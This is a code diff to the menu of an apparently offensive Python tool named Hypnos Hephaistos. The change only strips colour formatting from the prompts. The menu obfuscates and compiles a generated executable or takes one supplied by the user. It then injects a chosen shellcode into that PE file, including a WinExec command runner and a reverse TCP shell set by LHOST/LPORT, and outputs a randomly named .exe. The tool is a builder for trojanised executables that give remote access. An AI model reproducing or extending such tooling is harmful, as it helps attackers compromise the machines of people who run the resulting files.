@@ -10,7 +10,6 @@ from SRC.Libs import LibPeAnnalyzer
 from SRC.Libs import LibShellcode
 from SRC.Libs import LibPeEditor
 
-Color = LibDebug.COLORS()
 Env = LibDebug.CheckEnv()
 LibDebug.CheckHypnosReq()
 
@@ -18,11 +17,10 @@ def menu():
     outputfile = LibObfuscator.RandomizedString(7) + ".exe"
 
     print(
-        Color.GREEN + "Welcome to " + Color.RED +
-        "Hypnos Hephaistos Version__" + Color.RESET
+        "Welcome to Hypnos Hephaistos Version"
     )
     print(
-        "Do you want to " + Color.BLUE + "specify an executable" + Color.RESET + " to edit or did you want me to " + Color.BLUE + "generate one" + Color.RESET + " ? [" + Color.YELLOW + "edit" + Color.RESET + "/" + Color.YELLOW + "generate" + Color.RESET + "] or [" + Color.YELLOW + "e" + Color.RESET + "/" + Color.YELLOW + "g" + Color.RESET + "] : ", end=""
+        "Do you want to specify an executable to edit or did you want me to generate one ? [edit/generate] or [e/g] : ", end=""
     )
     value = input()
     case = ["generate", "edit", "e", "g"]
@@ -34,8 +32,7 @@ def menu():
                     LibObfuscator.GenerateC(50), 25)
                 inputfile = LibObfuscator.Compile(ObfuscatedC)
                 os.system("rm *.c")
-                LibDebug.Log("SUCCESS", Color.GREEN + inputfile +
-                             Color.RESET + " generated..")
+                LibDebug.Log("SUCCESS", inputfile + " generated..")
             except:
                 LibDebug.Log("ERROR", "Generation failed..")
         elif value == "edit" or value == "e":
@@ -51,14 +48,11 @@ def menu():
     PeInput = LibPeAnnalyzer.Extract(HexContent)
 
     if PeInput.Optionalpeheader.signature == "020b":
-            print(Color.RED + "!!" + Color.RESET + "Your file is a " + Color.YELLOW + "X64" + Color.RESET + " beware to pick a " + Color.YELLOW + "X64" + Color.RESET + " shellcode " + Color.RED + "!!")
+            print("!! Your file is a X64  beware to pick a X64  shellcode !!")
     elif PeInput.Optionalpeheader.signature == "010b":
-            print(Color.RED + "!!" + Color.RESET + "Your file is a " + Color.YELLOW + "X32" + Color.RESET + " beware to pick a " + Color.YELLOW + "X32" + Color.RESET + " shellcode " + Color.RED + "!!")
+            print("!! Your file is a X32  beware to pick a X32  shellcode !!")
 
-    print(
-        Color.GREEN + "It's time to generate a " + Color.RED + "shellcode" + Color.RESET + "." +
-        "\nHere's a list of options :"
-    )
+    print("It's time to generate a shellcode .\nHere's a list of options :")
 
     shellcodes = []
     for (dirpath, _, filenames) in os.walk("SHELLCODES"):
@@ -68,7 +62,7 @@ def menu():
     case = []
     for i in range(0, len(shellcodes)):
         case += str(i)
-        print("     " + Color.GREEN + str(i) + Color.RESET + " - " + shellcodes[i].replace("SHELLCODES/",""))
+        print("     " + str(i) + " - " + shellcodes[i].replace("SHELLCODES/",""))
 
     value = input("Select one shellcode : ")
     shellcode = LibShellcode.SHELLCODE()
@@ -79,14 +73,13 @@ def menu():
         selection = shellcodes[int(value)].replace("SHELLCODES/","")
         try:
             if "x32_Custom_Dynamic_WinExec" in selection:
-                print("Please enter your " + Color.YELLOW +
-                " COMMAND " + Color.RESET + " : ", end="")
+                print("Please enter your COMMAND   : ", end="")
                 CMD = input()
                 shellcode = LibShellcode.EditWinexec(shellcode, CMD)
             elif "x32_Custom_Dynamic_ReverseTCP_Shell" in selection:
-                print("Please enter your " + Color.YELLOW + " LHOST IP " + Color.RESET + " : ", end="")
+                print("Please enter your  LHOST IP   : ", end="")
                 LHOST = input()
-                print("Please enter your " + Color.YELLOW + " LPORT " + Color.RESET + " : ", end="")
+                print("Please enter your  LPORT   : ", end="")
                 LPORT = input()
                 shellcode = LibShellcode.EditCDRTSX32(shellcode, LHOST, LPORT)
         except:
@@ -121,10 +114,10 @@ def menu():
     #     try:
     #         if selection == "Custom_Dynamic_ReverseTCP_Shell":
     #             print("Please enter your " + Color.YELLOW +
-    #                           " LHOST IP " + Color.RESET + " : ", end="")
+    #                           " LHOST IP   : ", end="")
     #             LHOST = input()
     #             print("Please enter your " + Color.YELLOW +
-    #                           " LPORT " + Color.RESET + " : ", end="")
+    #                           " LPORT   : ", end="")
     #             LPORT = input()
     #             shellcode = LibShellcode.GenerateCDRTShell(LHOST, LPORT)
     #         elif selection == "Custom_Dynamic_ReverseTCP_Staged":
@@ -133,7 +126,7 @@ def menu():
     #             shellcode = LibShellcode.GenerateCDRTTShell()
     #         elif selection == "Custom_Dynamic_WinExec":
     #             print("Please enter your " + Color.YELLOW +
-    #                         " COMMAND " + Color.RESET + " : ", end="")
+    #                         " COMMAND   : ", end="")
     #             CMD = input()
     #             shellcode = LibShellcode.GenerateWinExec(CMD)
     #     except:
@@ -160,8 +153,7 @@ def menu():
     LibDebug.Log("WORK", "Generating edited executable..")
     LibByteEditor.CreateExeFromPe(outputfile, PeInput)
 
-    print("Did you want to verify the new executable ? [" + Color.YELLOW +
-                  "y" + Color.RESET + "/" + Color.YELLOW + "n" + Color.RESET + "] : ", end="")
+    print("Did you want to verify the new executable ? [y/n] : ", end="")
     value = input()
     case = ["y", "n"]
     if value in case:
@@ -172,9 +164,9 @@ def menu():
                 HexContent = LibByteEditor.GetHexFromFile(outputfile)
                 PeInput2 = LibPeAnnalyzer.Extract(HexContent)
                 LibDebug.ComparePe(PeInput, PeInput2)
-                LibDebug.Log("SUCCESS", "Your new file is " + Color.GREEN + outputfile + Color.RESET +".")
+                LibDebug.Log("SUCCESS", "Your new file is " + outputfile)
             elif value == "n":
-                LibDebug.Log("SUCCESS", "Your new file is " + Color.GREEN + outputfile + Color.RESET +".")
+                LibDebug.Log("SUCCESS", "Your new file is " + outputfile)
         except:
             LibDebug.Log(
                 "ERROR", "Something went wrong with the Verification. Exiting.")
